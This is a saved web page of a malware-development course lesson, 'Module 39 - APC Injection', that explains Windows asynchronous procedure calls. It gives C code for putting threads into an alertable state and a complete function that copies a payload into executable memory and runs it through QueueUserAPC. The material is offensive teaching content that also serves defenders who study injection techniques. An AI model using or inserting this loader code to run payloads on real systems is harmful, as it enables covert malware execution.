<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">
        <link rel="stylesheet" href="APC%20Injection_files/template.css">
        <link rel="shortcut icon" href="#favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="APC%20Injection_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="APC%20Injection_files/css2.css" rel="stylesheet">
        <link href="APC%20Injection_files/css2_002.css" rel="stylesheet">
        <title>APC Injection</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="APC%20Injection_files/app.fdbb573b.css"><link rel="stylesheet" href="APC%20Injection_files/app.fdbb573b.css"><link rel="stylesheet" href="APC%20Injection_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="#" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="APC%20Injection_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="#" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="#faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="#syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="#pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="#profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="#logout" method="POST">
            <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="#modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 39 - APC Injection
            </div>
            <div class="ml-2 w-4 h-4 bg-orange-600 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="APC%20Injection_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="APC%20Injection_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="APC%20Injection_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="#download/file/ApcInjection" target="_blank">
                    <img src="APC%20Injection_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>APC Injection</h2>
<h3>Introduction</h3>
<p>This module introduces another way to run a payload without having to
 create a new thread. This technique is known as APC injection.</p>
<h3>What is APC?</h3>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls" target="_blank">Asynchronous Procedure Calls</a>
 are a Windows operating system mechanism that enables programs to 
execute tasks asynchronously while continuing to run other tasks. APCs 
are implemented as kernel-mode routines that are executed in the context
 of a specific thread. Malware can leverage APCs to queue a payload and 
then have it execute when scheduled.</p>
<h4>Alertable State</h4>
<p>Not all threads can run a queued APC function, only threads in an <em>alertable state</em>
 can do so. An alertable state thread is a thread that is in a wait 
state. When a thread enters an alertable state it is placed in a queue 
of alertable threads, allowing it to run queued APC functions.</p>
<h3>What is APC Injection?</h3>
<p>To queue an APC function to a thread, the address of the APC function must be passed to the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc" target="_blank">QueueUserAPC</a> WinAPI. According to Microsoft's documentation:</p>
<p><em>An application queues an APC to a thread by calling the 
QueueUserAPC function. The calling thread specifies the address of an 
APC function in the call to QueueUserAPC.</em></p>
<p>The injected payload's address will be passed to <code>QueueUserAPC</code> in order to have it executed. Before doing so, a thread in the local process must be placed in an alertable state.</p>
<h3>QueueUserAPC</h3>
<p><code>QueueUserAPC</code> is shown below and it accepts 3 arguments:</p>
<ul>
<li>
<p><code>pfnAPC</code> - The address of the APC function to be called.</p>
</li>
<li>
<p><code>hThread</code> - A handle to an alertable thread or suspended thread.</p>
</li>
<li>
<p><code>dwData</code> - If the APC function requires parameters, they can be passed here. This value will be <code>NULL</code> in this module's code.</p>
</li>
</ul>
<pre><code>DWORD QueueUserAPC(
  [in] PAPCFUNC  pfnAPC,
  [in] HANDLE    hThread,
  [in] ULONG_PTR dwData
);
</code></pre>
<h3>Placing a Thread In An Alertable State</h3>
<p>The thread that will be executing the queued function needs to be in 
an alertable state. This can be done by creating a thread and using one 
of the following WinAPIs:</p>
<ul>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleep" target="_blank">Sleep</a></p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleepex" target="_blank">SleepEx</a></p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-msgwaitformultipleobjects" target="_blank">MsgWaitForMultipleObjects</a></p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-msgwaitformultipleobjectsex" target="_blank">MsgWaitForMultipleObjectsEx</a></p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject" target="_blank">WaitForSingleObject</a></p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobjectex" target="_blank">WaitForSingleObjectEx</a></p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitformultipleobjects" target="_blank">WaitForMultipleObjects</a></p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitformultipleobjectsex" target="_blank">WaitForMultipleObjectsEx</a></p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-signalobjectandwait" target="_blank">SignalObjectAndWait</a></p>
</li>
</ul>
<p>These functions are used for synchronizing threads and improving 
performance and responsiveness in applications, however in this case, 
passing a handle to a dummy event is sufficient. Passing the correct 
parameters to these functions is not necessary since simply using one of
 the functions is enough to place the thread in an alertable state.</p>
<p>To create a dummy event, the <a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventw" target="_blank">CreateEvent</a>
 WinAPI will be used. The newly created event object is a 
synchronization object that allows threads to communicate with each 
other by signaling and waiting for events. Since the output of <code>CreateEvent</code> is irrelevant, any valid event can be passed to the previously shown WinAPIs.</p>
<h4>Using The Functions</h4>
<p>Any of the following functions can be used as a sacrificial alertable
 thread to run the queued APC payload. See below for examples of how to 
use the functions to place the current thread in an alertable state.</p>
<p><strong>Using <code>Sleep</code></strong></p>
<pre><code>VOID AlertableFunction1() {

	Sleep(-1);
}

</code></pre>
<p><strong>Using <code>SleepEx</code></strong></p>
<pre><code>VOID AlertableFunction2() {
	
	SleepEx(INFINITE, TRUE);
}
</code></pre>
<p><strong>Using <code>WaitForSingleObject</code></strong></p>
<pre><code>VOID AlertableFunction3() {

	HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
	if (hEvent){
		WaitForSingleObject(hEvent, INFINITE);
		CloseHandle(hEvent);
	}
}
</code></pre>
<p><strong>Using <code>MsgWaitForMultipleObjects</code></strong></p>
<pre><code>VOID AlertableFunction4() {

	HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
	if (hEvent) {
		MsgWaitForMultipleObjects(1, &amp;hEvent, TRUE, INFINITE, QS_INPUT);
		CloseHandle(hEvent);
	}
}
</code></pre>
<p><strong>Using <code>SignalObjectAndWait</code></strong></p>
<pre><code>VOID AlertableFunction5() {
	
	HANDLE hEvent1 = CreateEvent(NULL, NULL, NULL, NULL);
	HANDLE hEvent2 = CreateEvent(NULL, NULL, NULL, NULL);

	if (hEvent1 &amp;&amp; hEvent2) {
		SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);
		CloseHandle(hEvent1);
		CloseHandle(hEvent2);
	}
}
</code></pre>
<h3>Suspended Threads</h3>
<p><code>QueueUserAPC</code> can also succeed if the target thread is created in a suspended state. If this method is used to execute the payload, <code>QueueUserAPC</code>
 should be called first and then the suspended thread should be resumed 
next. Again, the thread must be created in a suspended state, suspending
 an existing thread will not work.</p>
<p>The code shared in this module demonstrates APC injection via an alertable and suspended thread.</p>
<h3>APC Injection Implementation Logic</h3>
<p>To summarize, the implementation logic will be as follows:</p>
<ol>
<li>
<p>First, create a thread that runs one of the previously mentioned functions to place it in an alertable state.</p>
</li>
<li>
<p>Inject the payload into memory.</p>
</li>
<li>
<p>The thread handle and payload base address will be passed as input parameters to <code>QueueUserAPC</code>.</p>
</li>
</ol>
<h3>APC Injection Function</h3>
<p><code>RunViaApcInjection</code> is a function that performs APC Injection and requires 3 arguments:</p>
<ul>
<li>
<p><code>hThread</code> - A handle to an alertable or suspended thread.</p>
</li>
<li>
<p><code>pPayload</code> - A pointer to the payload's base address.</p>
</li>
<li>
<p><code>sPayloadSize</code> - The size of the payload.</p>
</li>
</ul>
<pre><code>BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;

	
	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(pAddress, pPayload, sPayloadSize);
	

	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
		printf("\t[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// If hThread is in an alertable state, QueueUserAPC will run the payload directly
	// If hThread is in a suspended state, the payload won't be executed unless the thread is resumed after
	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

</code></pre>
<br>
<h3>Demo - APC Injection Using An Alertable Thread</h3>
<p><img src="APC%20Injection_files/apc-demo-1-109284381-1875d55b-1574-4421-b4e9-6f6948a5a316.png" alt="image"></p>
<p><img src="APC%20Injection_files/apc-demo-1-209284381-1875d55b-1574-4421-b4e9-6f6948a5a316.png" alt="image"></p>
<br>
<h3>Demo - APC Injection Using a Suspended Thread</h3>
<p><img src="APC%20Injection_files/apc-demo-2-109284381-1875d55b-1574-4421-b4e9-6f6948a5a316.png" alt="image"></p>
<p><img src="APC%20Injection_files/apc-demo-2-209284381-1875d55b-1574-4421-b4e9-6f6948a5a316.png" alt="image"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Familiarize yourself with the QueueUserAPC WinAPI</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Use Microsoft's documentation to find other functions that place a thread in an alertable state</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="#modules/38"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="#modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="#modules/39/complete" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="#modules/39/progress" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="#modules/40"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="#" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="/" target="_blank">
#      </a></span><a class="text-gray-400 text-sm" href="/" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="/" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="/" target="_blank">        

        <script src="APC%20Injection_files/jquery-3.6.0.min.js"></script>
        <script src="APC%20Injection_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="APC%20Injection_files/app.4474f4d1.css"><link rel="modulepreload" href="APC%20Injection_files/app.5f3af5ce.js"><link rel="stylesheet" href="APC%20Injection_files/app.4474f4d1.css"><script type="module" src="APC%20Injection_files/app.5f3af5ce.js"></script><script src="APC%20Injection_files/navbar.js"></script>
<script src="APC%20Injection_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 39;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "#complete/objective" : "#remove/objective",
        type: "POST",
        data: {
        _token: "aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>